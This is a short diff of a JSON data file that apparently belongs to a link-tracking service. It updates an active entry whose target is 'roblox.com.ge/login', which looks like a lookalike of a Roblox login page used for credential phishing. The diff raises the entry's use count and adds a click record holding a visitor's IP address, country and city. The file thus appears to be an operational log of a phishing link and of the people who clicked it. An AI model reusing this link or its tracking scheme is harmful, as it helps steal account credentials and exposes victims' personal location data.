@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1569,
+    "useCount": 1570,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12720,6 +12720,14 @@
         "city": "Kitango",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777454216381,
+        "ip": "88.164.9.195",
+        "country": "France",
+        "city": "Orly",
+        "flag": "🇫🇷",
+        "countryCode": "FR"
       }
     ]
   },
